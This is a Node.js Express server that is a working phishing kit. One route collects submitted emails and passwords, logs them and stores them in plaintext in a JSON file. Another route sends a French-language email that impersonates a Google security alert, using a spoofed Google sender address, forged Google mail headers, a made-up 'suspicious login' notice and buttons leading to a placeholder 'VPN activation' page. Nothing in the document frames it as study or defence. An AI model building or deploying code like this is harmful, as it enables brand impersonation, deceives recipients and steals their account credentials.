const express = require('express');
const bodyParser = require('body-parser');
const { body, validationResult } = require('express-validator');
const fs = require('fs');
const path = require('path');
const nodemailer = require('nodemailer');
const dotenv = require('dotenv');
const cors = require('cors');

dotenv.config();

const app = express();
const port = process.env.PORT || 3000;
app.use(cors());

app.use(bodyParser.json());
app.use(express.static(path.join(__dirname, 'public'))); // Serve static files from the "public" directory

// Chemin vers le fichier JSON
const dataFilePath = path.join(__dirname, 'data.json');

// Configuration de Nodemailer
const transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: {
        user: process.env.EMAIL_USER,
        pass: process.env.EMAIL_PASS
    }
});

// Middleware pour la validation des entrées
app.post('/vpn',
    body('email').isEmail().withMessage('Veuillez fournir une adresse e-mail valide'),
    body('password').isLength({ min: 6 }).withMessage('Le mot de passe doit avoir au moins 6 caractères'),
    (req, res) => {
        // Valider les données d'entrée
        const errors = validationResult(req);
        if (!errors.isEmpty()) {
            return res.status(400).json({ errors: errors.array() });
        }

        const userInfo = req.body;
        console.log('Informations de l-utilisateur:', userInfo);

        // Lire les données existantes depuis le fichier JSON
        fs.readFile(dataFilePath, 'utf8', (err, data) => {
            if (err) {
                console.error('Erreur lors de la lecture du fichier JSON:', err);
                return res.status(500).json({ success: false, message: 'Erreur serveur' });
            }

            let users = [];
            if (data) {
                users = JSON.parse(data);
            }

            // Ajouter les nouvelles informations
            users.push(userInfo);

            // Écrire les données mises à jour dans le fichier JSON
            fs.writeFile(dataFilePath, JSON.stringify(users, null, 2), 'utf8', (err) => {
                if (err) {
                    console.error('Erreur lors de l\'écriture dans le fichier JSON:', err);
                    return res.status(500).json({ success: false, message: 'Erreur serveur' });
                }

                res.json({ success: true, message: 'Informations reçues avec succès' });
            });
        });
    });

// Route pour envoyer une notification par e-mail
// Route pour envoyer une notification par e-mail
app.post('/send-notification', (req, res) => {
    const { toEmail } = req.body;

    const mailOptions = {
        from: 'Google <noreply@google.com>',
        to: toEmail,
        subject: '🔒 Alerte de sécurité importante concernant votre compte Google',
        html: `
            <!DOCTYPE html>
            <html lang="fr">
            <head>
                <meta charset="UTF-8">
                <meta name="viewport" content="width=device-width, initial-scale=1.0">
                <meta http-equiv="X-UA-Compatible" content="IE=edge">
                <title>Sécurité compte Google</title>
                <style>
                    /* RESET & BASE STYLES */
                    body, p, h1, h2, h3, h4, h5, h6 {
                        margin: 0;
                        padding: 0;
                        font-family: 'Google Sans', 'Roboto', Arial, Helvetica, sans-serif;
                    }
                    
                    body {
                        background-color: #f1f3f4;
                        -webkit-font-smoothing: antialiased;
                        -moz-osx-font-smoothing: grayscale;
                    }
                    
                    /* MAIN CONTAINER */
                    .email-container {
                        max-width: 600px;
                        margin: 0 auto;
                        background-color: #ffffff;
                        border-radius: 20px;
                        overflow: hidden;
                        box-shadow: 0 4px 12px rgba(0, 0, 0, 0.08), 0 8px 24px rgba(0, 0, 0, 0.04);
                        border: 1px solid #e8eaed;
                    }
                    
                    /* GOOGLE HEADER */
                    .google-header {
                        padding: 28px 32px 12px 32px;
                        display: flex;
                        align-items: center;
                        justify-content: space-between;
                        border-bottom: 1px solid #f1f3f4;
                    }
                    
                    .logo-container {
                        display: flex;
                        align-items: center;
                    }
                    
                    .google-logo {
                        width: 82px;
                        height: auto;
                    }
                    
                    .security-badge {
                        background-color: #fce8e6;
                        color: #c5221f;
                        font-size: 12px;
                        font-weight: 500;
                        letter-spacing: 0.3px;
                        padding: 5px 12px;
                        border-radius: 100px;
                        margin-left: 16px;
                        border: 1px solid rgba(197, 34, 31, 0.1);
                    }
                    
                    /* MAIN CONTENT */
                    .content {
                        padding: 24px 32px 32px 32px;
                    }
                    
                    /* ALERT ICON */
                    .alert-icon-wrapper {
                        margin-bottom: 24px;
                        text-align: center;
                    }
                    
                    .alert-icon-circle {
                        background-color: #fce8e6;
                        width: 72px;
                        height: 72px;
                        border-radius: 50%;
                        margin: 0 auto;
                        display: flex;
                        align-items: center;
                        justify-content: center;
                    }
                    
                    .alert-icon {
                        width: 40px;
                        height: 40px;
                        fill: #c5221f;
                    }
                    
                    /* TYPOGRAPHY */
                    h1 {
                        font-size: 24px;
                        font-weight: 500;
                        color: #202124;
                        margin-bottom: 12px;
                        text-align: center;
                        line-height: 1.3;
                    }
                    
                    .timestamp {
                        font-size: 14px;
                        color: #5f6368;
                        text-align: center;
                        margin-bottom: 28px;
                        font-weight: 400;
                    }
                    
                    /* GREETING */
                    .greeting {
                        font-size: 16px;
                        color: #202124;
                        margin-bottom: 20px;
                        font-weight: 400;
                    }
                    
                    .greeting strong {
                        font-weight: 500;
                        color: #1a0dab;
                    }
                    
                    /* MESSAGE CARD */
                    .message-card {
                        background-color: #f8f9fa;
                        border-radius: 16px;
                        padding: 20px;
                        margin-bottom: 28px;
                        border-left: 4px solid #d93025;
                    }
                    
                    .message-card p {
                        font-size: 16px;
                        color: #3c4043;
                        line-height: 1.5;
                        margin-bottom: 16px;
                    }
                    
                    .message-card p:last-child {
                        margin-bottom: 0;
                    }
                    
                    .activity-details {
                        background-color: #ffffff;
                        border-radius: 12px;
                        padding: 16px;
                        margin-top: 16px;
                        border: 1px solid #e8eaed;
                    }
                    
                    .detail-item {
                        display: flex;
                        align-items: center;
                        margin-bottom: 12px;
                        font-size: 15px;
                        color: #3c4043;
                    }
                    
                    .detail-item:last-child {
                        margin-bottom: 0;
                    }
                    
                    .detail-icon {
                        width: 20px;
                        height: 20px;
                        margin-right: 16px;
                        fill: #5f6368;
                    }
                    
                    .detail-label {
                        width: 100px;
                        color: #5f6368;
                        font-size: 14px;
                    }
                    
                    .detail-value {
                        color: #202124;
                        font-weight: 500;
                        flex: 1;
                    }
                    
                    /* ACTION BUTTONS */
                    .action-buttons {
                        margin: 32px 0 24px 0;
                    }
                    
                    .btn-primary {
                        display: block;
                        width: 100%;
                        background-color: #1a73e8;
                        color: white;
                        text-decoration: none;
                        padding: 14px 24px;
                        border-radius: 36px;
                        font-size: 16px;
                        font-weight: 500;
                        text-align: center;
                        margin-bottom: 12px;
                        border: none;
                        box-sizing: border-box;
                        transition: background-color 0.2s;
                        border: 1px solid #1a73e8;
                    }
                    
                    .btn-primary:hover {
                        background-color: #1669d4;
                    }
                    
                    .btn-secondary {
                        display: block;
                        width: 100%;
                        background-color: transparent;
                        color: #1a73e8;
                        text-decoration: none;
                        padding: 14px 24px;
                        border-radius: 36px;
                        font-size: 16px;
                        font-weight: 500;
                        text-align: center;
                        border: 1px solid #dadce0;
                        box-sizing: border-box;
                        transition: background-color 0.2s;
                    }
                    
                    .btn-secondary:hover {
                        background-color: #f1f3f4;
                        border-color: #bdc1c6;
                    }
                    
                    /* HELPER TEXT */
                    .helper-text {
                        font-size: 13px;
                        color: #5f6368;
                        text-align: center;
                        margin: 24px 0 0 0;
                        line-height: 1.5;
                        padding: 0 16px;
                    }
                    
                    .helper-text a {
                        color: #1a73e8;
                        text-decoration: none;
                    }
                    
                    .helper-text a:hover {
                        text-decoration: underline;
                    }
                    
                    /* FOOTER */
                    .email-footer {
                        background-color: #f8f9fa;
                        padding: 24px 32px;
                        border-top: 1px solid #e8eaed;
                    }
                    
                    .footer-links {
                        display: flex;
                        flex-wrap: wrap;
                        justify-content: center;
                        gap: 24px;
                        margin-bottom: 20px;
                    }
                    
                    .footer-links a {
                        color: #5f6368;
                        text-decoration: none;
                        font-size: 13px;
                        font-weight: 400;
                    }
                    
                    .footer-links a:hover {
                        color: #1a73e8;
                    }
                    
                    .footer-copyright {
                        text-align: center;
                        color: #9aa0a6;
                        font-size: 12px;
                        display: flex;
                        align-items: center;
                        justify-content: center;
                        gap: 8px;
                    }
                    
                    .lock-icon {
                        width: 12px;
                        height: 12px;
                        fill: #9aa0a6;
                    }
                    
                    /* DIVIDER */
                    .divider {
                        height: 1px;
                        background-color: #e8eaed;
                        margin: 24px 0;
                    }
                    
                    /* RESPONSIVE */
                    @media (max-width: 600px) {
                        .content {
                            padding: 20px 24px;
                        }
                        
                        .google-header {
                            padding: 20px 24px 8px 24px;
                        }
                        
                        .email-footer {
                            padding: 20px 24px;
                        }
                        
                        h1 {
                            font-size: 22px;
                        }
                        
                        .detail-item {
                            flex-wrap: wrap;
                        }
                        
                        .detail-label {
                            width: 100%;
                            margin-bottom: 4px;
                        }
                        
                        .footer-links {
                            gap: 16px;
                        }
                    }
                    
                    /* DARK MODE SUPPORT (optionnel) */
                    @media (prefers-color-scheme: dark) {
                        body {
                            background-color: #202124;
                        }
                        
                        .email-container {
                            background-color: #2d2e30;
                            border-color: #3c4043;
                        }
                        
                        h1, .greeting, .detail-value {
                            color: #e8eaed;
                        }
                        
                        .greeting strong {
                            color: #8ab4f8;
                        }
                        
                        .timestamp, .detail-label, .helper-text {
                            color: #9aa0a6;
                        }
                        
                        .message-card {
                            background-color: #3c4043;
                        }
                        
                        .activity-details {
                            background-color: #2d2e30;
                            border-color: #5f6368;
                        }
                        
                        .btn-secondary {
                            border-color: #5f6368;
                            color: #8ab4f8;
                        }
                        
                        .btn-secondary:hover {
                            background-color: #3c4043;
                        }
                        
                        .email-footer {
                            background-color: #3c4043;
                            border-color: #5f6368;
                        }
                        
                        .footer-links a {
                            color: #9aa0a6;
                        }
                        
                        .divider {
                            background-color: #5f6368;
                        }
                    }
                </style>
            </head>
            <body style="margin: 0; padding: 24px; background-color: #f1f3f4; font-family: 'Google Sans', 'Roboto', Arial, sans-serif;">
                <table width="100%" cellpadding="0" cellspacing="0" border="0" style="background-color: #f1f3f4; padding: 24px;">
                    <tr>
                        <td align="center">
                            <div class="email-container">
                                <!-- En-tête Google -->
                                <div class="google-header">
                                    <div class="logo-container">
                                        <img class="google-logo" src="https://www.gstatic.com/images/branding/googlelogo/svg/googlelogo_clr_74x24px.svg" alt="Google" style="display: block; width: 82px; height: auto; border: 0;">
                                        <span class="security-badge">ALERTE SÉCURITÉ</span>
                                    </div>
                                </div>
                                
                                <!-- Contenu principal -->
                                <div class="content">
                                    <!-- Icône d'alerte -->
                                    <div class="alert-icon-wrapper">
                                        <div class="alert-icon-circle">
                                            <svg class="alert-icon" viewBox="0 0 24 24" style="width: 40px; height: 40px;">
                                                <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z" fill="#c5221f"/>
                                            </svg>
                                        </div>
                                    </div>
                                    
                                    <h1>Activité suspecte détectée</h1>
                                    <div class="timestamp">Aujourd'hui à ${new Date().toLocaleTimeString('fr-FR', { hour: '2-digit', minute: '2-digit' })}</div>
                                    
                                    <div class="greeting">
                                        <strong>Chère cher utilisateur,</strong>
                                    </div>
                                    
                                    <div class="message-card">
                                        <p>Nous avons détecté une <strong>tentative de connexion inhabituelle</strong> sur votre compte Google. Pour protéger vos données personnelles, nous vous recommandons d'activer immédiatement la connexion sécurisée VPN.</p>
                                        
                                        <div class="activity-details">
                                            <div class="detail-item">
                                                <svg class="detail-icon" viewBox="0 0 24 24" style="width: 20px; height: 20px;">
                                                    <path d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7zm0 9.5c-1.38 0-2.5-1.12-2.5-2.5s1.12-2.5 2.5-2.5 2.5 1.12 2.5 2.5-1.12 2.5-2.5 2.5z" fill="#5f6368"/>
                                                </svg>
                                                <span class="detail-label">Localisation</span>
                                                <span class="detail-value">Paris, France (nouvel appareil)</span>
                                            </div>
                                            <div class="detail-item">
                                                <svg class="detail-icon" viewBox="0 0 24 24" style="width: 20px; height: 20px;">
                                                    <path d="M20 18c1.1 0 1.99-.9 1.99-2L22 6c0-1.1-.9-2-2-2H4c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2H0v2h24v-2h-4zM4 6h16v10H4V6z" fill="#5f6368"/>
                                                </svg>
                                                <span class="detail-label">Appareil</span>
                                                <span class="detail-value">Windows · Chrome</span>
                                            </div>
                                            <div class="detail-item">
                                                <svg class="detail-icon" viewBox="0 0 24 24" style="width: 20px; height: 20px;">
                                                    <path d="M11.99 2C6.47 2 2 6.48 2 12s4.47 10 9.99 10C17.52 22 22 17.52 22 12S17.52 2 11.99 2zM12 20c-4.42 0-8-3.58-8-8s3.58-8 8-8 8 3.58 8 8-3.58 8-8 8zm.5-13H11v6l5.25 3.15.75-1.23-4.5-2.67z" fill="#5f6368"/>
                                                </svg>
                                                <span class="detail-label">Heure</span>
                                                <span class="detail-value">${new Date().toLocaleDateString('fr-FR')} à ${new Date().toLocaleTimeString('fr-FR', { hour: '2-digit', minute: '2-digit' })}</span>
                                            </div>
                                        </div>
                                    </div>
                                    
                                    <!-- Boutons d'action -->
                                    <div class="action-buttons">
                                        <a href="https://your-vpn-activation-page.com" class="btn-primary" style="color: white; background-color: #1a73e8;">🔒 Activer la protection VPN maintenant</a>
                                        <a href="https://your-vpn-activation-page.com" class="btn-secondary" style="color: #1a73e8;">✓ Vérifier l'activité du compte</a>
                                    </div>
                                    
                                    <div class="divider"></div>
                                    
                                    <div class="helper-text">
                                        <p style="margin-bottom: 8px;">❓ Vous n'êtes pas à l'origine de cette activité ?</p>
                                        <p style="margin-bottom: 4px;"><a href="#">Sécurisez votre compte immédiatement</a> • <a href="#">Signaler cette activité</a></p>
                                        <p style="margin-top: 16px; font-size: 12px;">Cette notification a été envoyée à <strong>${toEmail}</strong> pour vous informer d'une activité importante concernant votre compte.</p>
                                    </div>
                                </div>
                                
                                <!-- Pied de page -->
                                <div class="email-footer">
                                    <div class="footer-links">
                                        <a href="#">Aide</a>
                                        <a href="#">Confidentialité</a>
                                        <a href="#">Conditions</a>
                                        <a href="#">Préférences</a>
                                    </div>
                                    <div class="footer-copyright">
                                        <svg class="lock-icon" viewBox="0 0 24 24" style="width: 12px; height: 12px;">
                                            <path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z" fill="#9aa0a6"/>
                                        </svg>
                                        <span>Google LLC · 1600 Amphitheatre Parkway, Mountain View, CA 94043</span>
                                    </div>
                                </div>
                            </div>
                        </td>
                    </tr>
                </table>
            </body>
            </html>
        `,
        headers: {
            'X-Google-Original-Message-ID': '1234567890abcdef1234567890abcdef',
            'X-Google-SMTP-Source': 'AMS1',
            'X-Google-DKIM-Signature': 'v=1; a=rsa-sha256; c=relaxed/relaxed; ...',
            'X-Priority': '1',
            'X-Mailer': 'Google Mail Service'
        }
    };

    transporter.sendMail(mailOptions, (error, info) => {
        if (error) {
            return res.status(500).json({ success: false, message: 'Erreur lors de l\'envoi de l\'e-mail' });
        }
        res.json({ success: true, message: 'Notification envoyée avec succès' });
    });
});
// Gestion des erreurs globale
app.use((err, req, res, next) => {
    console.error(err.stack);
    res.status(500).json({ success: false, message: 'Erreur serveur' });
});

app.listen(port, '0.0.0.0', () => {
    console.log(`Serveur en écoute..`);
});
